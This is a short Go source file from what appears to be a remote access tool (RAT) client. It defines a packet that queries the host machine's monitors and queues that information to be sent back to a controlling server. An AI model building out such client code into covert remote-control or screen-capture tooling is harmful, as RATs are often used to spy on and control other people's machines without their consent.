package main

import (
	"rat/client/screen"
	"rat/shared"
	"rat/shared/network/header"
)

type MonitorsPacket struct {
	Monitors []shared.Monitor `network:"send"`
}

func (packet MonitorsPacket) Header() header.PacketHeader {
	return header.MonitorsHeader
}

func (packet *MonitorsPacket) Init() {
	screen.QueryMonitors()

	packet.Monitors = screen.Monitors
}

func (packet MonitorsPacket) OnReceive() error {
	Queue <- &MonitorsPacket{}
	return nil
}
